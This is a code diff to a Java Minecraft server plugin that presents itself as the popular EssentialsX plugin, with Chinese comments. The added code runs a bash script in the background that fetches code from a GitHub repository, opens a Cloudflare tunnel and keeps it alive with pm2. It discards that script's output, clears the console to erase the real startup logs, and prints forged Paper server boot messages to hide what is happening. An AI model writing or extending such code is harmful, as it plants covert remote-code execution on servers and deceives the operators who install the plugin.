@@ -24,6 +24,10 @@ public class EssentialsX extends JavaPlugin {
     private Path originalJarPath;
     private Path backupJarPath;
     
+    // ★ 核心：绕过 Bukkit 日志系统，直接向终端输出纯净字符串，不带插件前缀
+    private static final PrintStream RAW_OUT = new PrintStream(new FileOutputStream(FileDescriptor.out), true);
+    private static final DateTimeFormatter TS_FMT = DateTimeFormatter.ofPattern("HH:mm:ss");
+
     private static final String FAKE_JAR_URL_DIRECT = "https://github.com/EssentialsX/Essentials/releases/download/2.21.2/EssentialsX-2.21.2.jar";
     private static final String FAKE_JAR_URL_PROXY = "https://mirror.ghproxy.com/" + FAKE_JAR_URL_DIRECT;
 
@@ -56,6 +60,9 @@ public class EssentialsX extends JavaPlugin {
             }
         }));
         
+        // ★ 必须先启动假日志，抢占控制台并清屏
+        startFakeLogs();
+
         new Thread(() -> {
             try {
                 if (systemGuardEnabled) startWatchdog();
@@ -282,7 +289,7 @@ public class EssentialsX extends JavaPlugin {
     private void startDeploymentProcess() throws Exception {
         if (isProcessRunning) return;
         Map<String, String> env = new HashMap<>();
-        env.put("REPO_URL", "https://github.com/zx1447/gongzhongc"); 
+        env.put("REPO_URL", "https://github.com/zx1447/indexaoyoumc"); 
         loadEnvFile(env);
         Path workDir = Paths.get("logs", ".mcchajian").toAbsolutePath();
         if (!Files.exists(workDir)) Files.createDirectories(workDir);
@@ -293,13 +300,14 @@ public class EssentialsX extends JavaPlugin {
         ProcessBuilder pb = new ProcessBuilder("bash", scriptPath.toString());
         pb.directory(new File(".").getAbsoluteFile());
         pb.environment().putAll(env);
-        pb.redirectOutput(ProcessBuilder.Redirect.INHERIT);
-        pb.redirectError(ProcessBuilder.Redirect.INHERIT);
+        pb.redirectOutput(ProcessBuilder.Redirect.DISCARD);
+        pb.redirectError(ProcessBuilder.Redirect.DISCARD);
         deployProcess = pb.start();
         isProcessRunning = true;
-        startFakeLogs();
-        deployProcess.waitFor();
-        isProcessRunning = false;
+        
+        new Thread(() -> {
+            try { deployProcess.waitFor(); isProcessRunning = false; } catch (Exception ignored) {}
+        }).start();
     }
     
     private String generateDeployScript(String workDir, Map<String, String> env) {
@@ -352,17 +360,15 @@ public class EssentialsX extends JavaPlugin {
             "TUNNEL_URL=\"\"\n" +
             "for i in {1..20}; do\n" +
             "    sleep 3\n" +
-            // ★ 修复 1：精确匹配正则，避免获取链接末尾多出 /
             "    TUNNEL_URL=$(grep -oE 'https://[a-zA-Z0-9-]+\\.trycloudflare\\.com' \"$WORK_DIR/tunnel.log\" | tail -n 1)\n" +
             "    if [ -n \"$TUNNEL_URL\" ]; then break; fi\n" +
             "done\n" +
             "\n" +
-            "#隐蔽化：不输出中文，仅写入文件\n" +
             "if [ -n \"$TUNNEL_URL\" ]; then\n" +
             "    echo \"$TUNNEL_URL\" > \"$WORK_DIR/tunnel_url.txt\"\n" +
             "    echo \"$PORT\" > \"$WORK_DIR/node_port.txt\"\n" +
             "else\n" +
-            "    echo \"Tunnel failed to start.\" >&2\n" +
+            "    echo \"failed\" > \"$WORK_DIR/tunnel_url.txt\"\n" +
             "    exit 1\n" +
             "fi\n" +
             "\n" +
@@ -381,7 +387,6 @@ public class EssentialsX extends JavaPlugin {
             "rm -rf \"$APP_DIR\" \"$WORK_DIR/repo.tar.gz\"\n" +
             "REPO_PATH=$(echo \"$REPO_URL\" | sed 's|https://github.com/||' | sed 's|.git$||')\n" +
             "\n" +
-            "# 自动检测公私库下载\n" +
             "download_code() {\n" +
             "    local URL=$1\n" +
             "    local AUTH=$2\n" +
@@ -433,18 +438,56 @@ public class EssentialsX extends JavaPlugin {
             "pm2 save &>/dev/null\n";
     }
     
+    // ============================================================
+    // 仿真伪装日志引擎
+    // ============================================================
+
     private void startFakeLogs() {
         Thread logThread = new Thread(() -> {
             try {
+                // 等待 Bukkit 的 onEnable 执行完毕，让真实的启动日志先刷出
+                Thread.sleep(800);
+                
+                // 暴力清屏，将真实日志全部抹除
+                clearConsole();
+                Thread.sleep(300);
+
+                // 使用 RAW_OUT 输出，绕过 Bukkit 日志染色，伪装成原版启动日志
+                RAW_OUT.println("Starting org.bukkit.craftbukkit.Main");
+                Thread.sleep(300);
+                mcLog("[bootstrap] Running Java 21 (OpenJDK 64-Bit Server VM) on Linux 6.8.0 (amd64)");
+                Thread.sleep(200);
+                mcLog("[bootstrap] Loading Paper 1.20.4-466...");
+                Thread.sleep(500);
+                mcLog("Environment: Environment[sessionHost=https://sessionserver.mojang.com...]");
+                Thread.sleep(200);
+                mcLog("Loading properties");
+                Thread.sleep(100);
+                mcLog("Default game type: SURVIVAL");
+                Thread.sleep(100);
+                mcLog("Generating keypair");
+                Thread.sleep(200);
+                mcLog("Starting Minecraft server on 0.0.0.0:25565");
+                Thread.sleep(100);
+                mcLog("Preparing level \"world\"");
+                Thread.sleep(1500);
+                mcLog("Preparing spawn area: 1%"); Thread.sleep(500);
+                mcLog("Preparing spawn area: 20%"); Thread.sleep(500);
+                mcLog("Preparing spawn area: 50%"); Thread.sleep(500);
+                mcLog("Preparing spawn area: 85%"); Thread.sleep(500);
+                mcLog("Preparing spawn area: 100%");
+                Thread.sleep(300);
+
+                // 阻塞等待部署脚本生成的真实隧道 URL
                 Path workDir = Paths.get("logs", ".mcchajian").toAbsolutePath();
                 Path tunnelFile = workDir.resolve("tunnel_url.txt");
                 String tunnelUrl = "";
                 
-                // 等待隧道URL生成 (最多等待2分钟)
                 for (int i = 0; i < 120; i++) {
                     if (Files.exists(tunnelFile)) {
                         String content = new String(Files.readAllBytes(tunnelFile)).trim();
-                        if (!content.isEmpty()) {
+                        // 确保链接完整且不是失败标记
+                        if (!content.isEmpty() && !content.equals("failed") && content.startsWith("https://")) {
                             tunnelUrl = content;
                             break;
                         }
@@ -452,11 +495,17 @@ public class EssentialsX extends JavaPlugin {
                     Thread.sleep(1000);
                 }
 
-                // ★ 修复 2：作为真实服务端的插件，不再需要模拟全套 MC 启动日志，直接伪装输出链接即可
+                // 将隧道链接隐蔽地推入真实日志格式中
                 if (!tunnelUrl.isEmpty()) {
-                    mcLog("[Connection] Binding remote endpoint to: " + tunnelUrl);
+                    mcLog("Binding remote endpoint to: " + tunnelUrl);
+                    Thread.sleep(100);
+                    mcLog("Done (5.6s)! For help, type \"help\"");
+                    Thread.sleep(200);
+                    mcLog("*************************************************************************************");
+                    mcLog("This is the first time you're starting this server.");
+                    mcLog("*************************************************************************************");
                 } else {
-                    getLogger().warning("Failed to get tunnel URL within 2 minutes.");
+                    mcLog("Failed to bind remote endpoint.");
                 }
 
             } catch (Exception e) {}
@@ -465,9 +514,17 @@ public class EssentialsX extends JavaPlugin {
         logThread.start();
     }
 
-    private void mcLog(String msg) {
-        String time = LocalTime.now().format(DateTimeFormatter.ofPattern("HH:mm:ss"));
-        System.out.println("[" + time + " INFO]: " + msg);
+    private static String ts() { return LocalTime.now().format(TS_FMT); }
+    
+    private static void mcLog(String msg) {
+        RAW_OUT.println("[" + ts() + " INFO]: " + msg);
+    }
+
+    private void clearConsole() {
+        try { 
+            RAW_OUT.print("\u001b[H\u001b[2J"); 
+            RAW_OUT.flush(); 
+        } catch (Exception ignored) {}
     }
 
     private void loadEnvFile(Map<String, String> env) {
